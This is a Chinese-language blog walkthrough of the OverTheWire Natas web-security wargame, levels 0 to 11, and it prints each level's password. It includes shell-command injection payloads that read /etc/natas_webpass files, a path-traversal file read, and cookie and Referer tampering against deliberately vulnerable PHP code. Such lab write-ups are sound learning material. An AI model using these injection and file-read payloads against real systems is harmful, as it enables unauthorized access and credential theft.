@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>OverTheWire Natas Walkthrough-1 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">OverTheWire Natas Walkthrough-1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 20, 2020&nbsp;&nbsp;15:12:09</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><strong>Natas</strong>是OverTheWire网站中一个关于Web安全的一个在线靶场，采取闯关的方式，题目一般是循序渐进的，做了几道觉得觉得还挺有意思的，所以记录一下。</p>
+<p>链接： <a href="https://overthewire.org/wargames/natas/" target="_blank" rel="noopener">https://overthewire.org/wargames/natas/</a> </p>
+<p>每一关的目标就是获得下一关的登录密码。每关的密码都存放在<code>/etc/natas_webpass/natasX</code>中，比如打开<a href="http://natas0.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas0.natas.labs.overthewire.org</a> 的密码就存放在<code>/etc/natas_webpass/natas5</code>中。</p>
+<h3 id="natas0"><a href="#natas0" class="headerlink" title="natas0"></a>natas0</h3><p>链接：<a href="http://natas0.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas0.natas.labs.overthewire.org</a></p>
+<p>打开题目，直接右键查看源码就可以看到<code>natas1</code>的登录密码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="natas-Level-0-gt-natas-Level-1"><a href="#natas-Level-0-gt-natas-Level-1" class="headerlink" title="natas Level 0 -&gt; natas Level 1"></a>natas Level 0 -&gt; natas Level 1</h3><p>链接：<a href="http://natas1.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas1.natas.labs.overthewire.org</a></p>
+<p>打开题目看到提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can find the password for the next level on this page, but rightclicking has been blocked!</span><br></pre></td></tr></table></figure>
+
+<p>不能查看源码了，所以直接<code>F12</code>看源码，发现登录密码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="natas-Level-1-gt-natas-Level-2"><a href="#natas-Level-1-gt-natas-Level-2" class="headerlink" title="natas Level 1 -&gt; natas Level 2"></a>natas Level 1 -&gt; natas Level 2</h3><p>链接：<a href="http://natas2.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas2.natas.labs.overthewire.org</a></p>
+<p>打开题目，再次查看源码，在源码中发现了可疑的<code>files/pixel.png</code></p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/4.png" alt="4"></p>
+<p>没发现什么东西，但是这说明在Web目录下存在一个叫做<code>files</code>的子目录，直接访问一下这个子目录<code>http://natas2.natas.labs.overthewire.org/files/</code>：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/5.png" alt="5"></p>
+<p>查看<code>users.txt</code>文件，在里面发现了<code>natas3</code>的登录密码：<code>natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</code>。</p>
+<h3 id="natas-Level-2-gt-natas-Level-3"><a href="#natas-Level-2-gt-natas-Level-3" class="headerlink" title="natas Level 2 -&gt; natas Level 3"></a>natas Level 2 -&gt; natas Level 3</h3><p>链接：<a href="http://natas3.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas3.natas.labs.overthewire.org</a></p>
+<p>右键查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提示说即使<code>Google</code>搜索也不会发现，也就是提示我们应该去看<code>robots.txt</code>文件，因为这个文件通常会告诉网络搜索引擎网站中的哪些内容是不应该爬取的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;s3cr3t&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们访问<code>http://natas3.natas.labs.overthewire.org/s3cr3t/</code>，得到一个<code>user.txt</code>文件，访问该文件得到下一关的登录密码：<code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code>。</p>
+<h3 id="natas-Level-3-gt-natas-Level-4"><a href="#natas-Level-3-gt-natas-Level-4" class="headerlink" title="natas Level 3 -&gt; natas Level 4"></a>natas Level 3 -&gt; natas Level 4</h3><p>链接：<a href="http://natas4.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas4.natas.labs.overthewire.org</a></p>
+<p>打开题目看到提示说当前访问的<code>referer</code>来自<code>http://natas4.natas.labs.overthewire.org/</code>，但是应该来自<code>http://natas5.natas.labs.overthewire.org/</code>：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/6.png" alt="6"></p>
+<p>所以用burp抓个包，改个referer就可以了：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/7.png" alt="7"></p>
+<p>得到下一关的密码：<code>iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code>。</p>
+<h3 id="natas-Level-4-gt-natas-Level-5"><a href="#natas-Level-4-gt-natas-Level-5" class="headerlink" title="natas Level 4 -&gt; natas Level 5"></a>natas Level 4 -&gt; natas Level 5</h3><p>链接：<a href="http://natas5.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas5.natas.labs.overthewire.org</a></p>
+<p>本关提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access disallowed. You are not logged in</span><br></pre></td></tr></table></figure>
+
+<p>用burp抓个包看看，发现存在<code>cookie</code>字段<code>loggedin=0</code>，显然<code>0</code>表示没登录，改成<code>1</code>即可：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/8.png" alt="8"></p>
+<p>得到登陆密码：<code>aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code>。</p>
+<h3 id="natas-Level-5-gt-natas-Level-6"><a href="#natas-Level-5-gt-natas-Level-6" class="headerlink" title="natas Level 5 -&gt; natas Level 6"></a>natas Level 5 -&gt; natas Level 6</h3><p>链接：<a href="http://natas6.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas6.natas.labs.overthewire.org</a></p>
+<p>打开题目，本关有源码，看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"includes/secret.inc"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"submit"</span>, $_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span>($secret == $_POST[<span class="string">'secret'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Access granted. The password for natas7 is &lt;censored&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Wrong secret"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们需要传入一个POST参数<code>secret</code>，这个值需要和变量<code>$secret</code>的值一样，所以要先得到<code>$secret</code>的值。</p>
+<p>在源码顶部包含了文件<code>includes/secret.inc</code>，<code>$secret</code>参数应该就在这个文件中，访问一下可以得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$secret = <span class="string">"FOEIUWGHFEEUHOFUOIU"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以得到下一关的密码：<code>7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code>。</p>
+<h3 id="natas-Level-6-gt-natas-Level-7"><a href="#natas-Level-6-gt-natas-Level-7" class="headerlink" title="natas Level 6 -&gt; natas Level 7"></a>natas Level 6 -&gt; natas Level 7</h3><p>链接：<a href="http://natas7.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas7.natas.labs.overthewire.org</a></p>
+<p>打开题目看到：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/9.png" alt="9"></p>
+<p>这里有两个页面，<code>Home</code>和<code>About</code>，点击一下<code>Home</code>发现url发生了改变，变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;natas7.natas.labs.overthewire.org&#x2F;index.php?page&#x3D;home</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>About</code>，就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;natas7.natas.labs.overthewire.org&#x2F;index.php?page&#x3D;about</span><br></pre></td></tr></table></figure>
+
+<p>然后右键查看源码看到提示：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;natas7.natas.labs.overthewire.org&#x2F;index.php?page&#x3D;&#x2F;etc&#x2F;natas_webpass&#x2F;natas8</span><br></pre></td></tr></table></figure>
+
+<p>就能得到密码：<code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code>。</p>
+<h3 id="natas-Level-7-gt-natas-Level-8"><a href="#natas-Level-7-gt-natas-Level-8" class="headerlink" title="natas Level 7 -&gt; natas Level 8"></a>natas Level 7 -&gt; natas Level 8</h3><p>链接：<a href="http://natas8.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas8.natas.labs.overthewire.org</a></p>
+<p>本关又是很简单的代码审计：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$encodedSecret = <span class="string">"3d3d516343746d4d6d6c315669563362"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeSecret</span><span class="params">($secret)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(strrev(base64_encode($secret)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"submit"</span>, $_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(encodeSecret($_POST[<span class="string">'secret'</span>]) == $encodedSecret) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Access granted. The password for natas9 is &lt;censored&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Wrong secret"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>源码中对用户传递的参数<code>$_POST[&#39;secret&#39;]</code>进行了简单的加密，加密后的值应该和<code>$encodedSecret</code>相同，所以对<code>$encodedSecret</code>进行解密就可以知道我们应该传递怎样的参数值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code = <span class="string">"3d3d516343746d4d6d6c315669563362"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decodeSecret</span><span class="params">($secret)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> base64_decode(strrev(hex2bin($secret)));</span><br><span class="line">&#125;</span><br><span class="line">print_r(decodeSecret($code));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>令<code>secret</code>为<code>oubWYf2kBq</code>，得到下一关的密码：<code>W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code>。</p>
+<h3 id="natas-Level-8-gt-natas-Level-9"><a href="#natas-Level-8-gt-natas-Level-9" class="headerlink" title="natas Level 8 -&gt; natas Level 9"></a>natas Level 8 -&gt; natas Level 9</h3><p>链接：<a href="http://natas9.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas9.natas.labs.overthewire.org</a></p>
+<p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$key = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"needle"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[<span class="string">"needle"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($key != <span class="string">""</span>) &#123;</span><br><span class="line">    passthru(<span class="string">"grep -i $key dictionary.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>源码中可以看到需要我们传入参数<code>needle</code>，如果<code>needle</code>不为空字符串，则调用<code>passthru</code>函数执行<code>grep</code>命令读取<code>dictionary.txt</code>文件中的内容，其中<code>-i</code>表示不区分大小写。</p>
+<p>而且题目中已经告知，每关的flag都存放在<code>/etc/natas_webpass/natasX</code>中，其中<code>X</code>表示关卡数，所以本关的flag存放在<code>/etc/natas_webpass/natas10</code>中。</p>
+<p>所以我构造了<code>grep -i 123 123.txt || cat /etc/natas_webpass/natas10 %23</code>。</p>
+<p>我们知道在linux中可以一次性执行多个命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd1;cmd2;cmd3;	&#x2F;&#x2F; 命令执行前后没有依赖关系</span><br><span class="line">cmd1 || cmd2	&#x2F;&#x2F; 命令cmd1执行失败了之后会执行cmd2，命令cmd1执行成功则不执行cmd2</span><br><span class="line">cmd1 &amp;&amp; cmd2 	&#x2F;&#x2F; 当命令cmd1执行成功之后才会执行cmd2</span><br></pre></td></tr></table></figure>
+
+<p>因为不存在<code>123.txt</code>，所以会执行<code>cat /etc/passwd</code>：</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/2.png" alt="2"></p>
+<p>而且在命令执行中<code>#</code>符号表示注释掉后面的命令，如下面这个例子只会输出<code>10</code>，<code>#</code>后面的会被注释掉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo 10 # 100</span><br><span class="line">10</span><br></pre></td></tr></table></figure>
+
+<p>当然对于这个例子来说，没有<code>#</code>也无妨，只是会输出<code>dictionary.txt</code>中的内容而已，但是如果要用的话得注意将<code>#</code>编码。</p>
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/1.png" alt="1"></p>
+<p>得到<code>natas10</code>的密码：<code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code>。</p>
+<h3 id="natas-Level-9-gt-natas-Level-10"><a href="#natas-Level-9-gt-natas-Level-10" class="headerlink" title="natas Level 9 -&gt; natas Level 10"></a>natas Level 9 -&gt; natas Level 10</h3><p>链接：<a href="http://natas10.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas10.natas.labs.overthewire.org</a></p>
+<p>直接查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$key = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"needle"</span>, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[<span class="string">"needle"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($key != <span class="string">""</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[;|&amp;]/'</span>,$key)) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Input contains an illegal character!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        passthru(<span class="string">"grep -i $key dictionary.txt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题我们看到是用<code>preg_replace</code>函数对<code>needle</code>参数进行过滤，在<code>needle</code>参数中不能包含<code>;</code>，<code>|</code>和<code>&amp;</code>字符。</p>
+<p>但是<code>grep</code>命令和<code>cat</code>命令一样，都是可以读取多文件的，而且支持正则表达式搜索，所以我们可以这样构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.* &#x2F;etc&#x2F;natas_webpass&#x2F;natas11 %23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/20/OverTheWire-Natas-Walkthrough-1/imgs/3.png" alt="3"></p>
+<p>得到密码：<code>U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</code>。</p>
+<h3 id="natas-Level-10-gt-natas-Level-11"><a href="#natas-Level-10-gt-natas-Level-11" class="headerlink" title="natas Level 10 -&gt; natas Level 11"></a>natas Level 10 -&gt; natas Level 11</h3><p>链接：<a href="http://natas11.natas.labs.overthewire.org" target="_blank" rel="noopener">http://natas11.natas.labs.overthewire.org</a></p>
+<p>先看下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$defaultdata = <span class="keyword">array</span>( <span class="string">"showpassword"</span>=&gt;<span class="string">"no"</span>, <span class="string">"bgcolor"</span>=&gt;<span class="string">"#ffffff"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">($in)</span> </span>&#123;</span><br><span class="line">    $key = <span class="string">'&lt;censored&gt;'</span>;</span><br><span class="line">    $text = $in;</span><br><span class="line">    $outText = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Iterate through each character</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">    $outText .= $text[$i] ^ $key[$i % strlen($key)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $outText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($def)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_COOKIE;</span><br><span class="line">    $mydata = $def;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">"data"</span>, $_COOKIE)) &#123;</span><br><span class="line">    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[<span class="string">"data"</span>])), <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(is_array($tempdata) &amp;&amp; array_key_exists(<span class="string">"showpassword"</span>, $tempdata) &amp;&amp; array_key_exists(<span class="string">"bgcolor"</span>, $tempdata)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^#(?:[a-f\d]&#123;6&#125;)$/i'</span>, $tempdata[<span class="string">'bgcolor'</span>])) &#123;</span><br><span class="line">        $mydata[<span class="string">'showpassword'</span>] = $tempdata[<span class="string">'showpassword'</span>];</span><br><span class="line">        $mydata[<span class="string">'bgcolor'</span>] = $tempdata[<span class="string">'bgcolor'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $mydata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveData</span><span class="params">($d)</span> </span>&#123;</span><br><span class="line">    setcookie(<span class="string">"data"</span>, base64_encode(xor_encrypt(json_encode($d))));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"bgcolor"</span>,$_REQUEST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^#(?:[a-f\d]&#123;6&#125;)$/i'</span>, $_REQUEST[<span class="string">'bgcolor'</span>])) &#123;</span><br><span class="line">        $data[<span class="string">'bgcolor'</span>] = $_REQUEST[<span class="string">'bgcolor'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saveData($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;natas11&lt;/h1&gt;</span><br><span class="line">&lt;div id=<span class="string">"content"</span>&gt;</span><br><span class="line">&lt;body style=<span class="string">"background: &lt;?=$data['bgcolor']?&gt;;"</span>&gt;</span><br><span class="line">Cookies are <span class="keyword">protected</span> with <span class="keyword">XOR</span> encryption&lt;br/&gt;&lt;br/&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>($data[<span class="string">"showpassword"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"The password for natas12 is &lt;censored&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>页面中同时存在提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookies are protected with XOR encryption</span><br></pre></td></tr></table></figure>
+
+<p>用burp抓个包，能看到这样的Cookie值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: data&#x3D;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D</span><br></pre></td></tr></table></figure>
+
+<p>这道题需要一点密码学知识，我在这一块不太灵光，所以就先借用别人的答案。</p>
+<p>密码 : <code>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code></p>
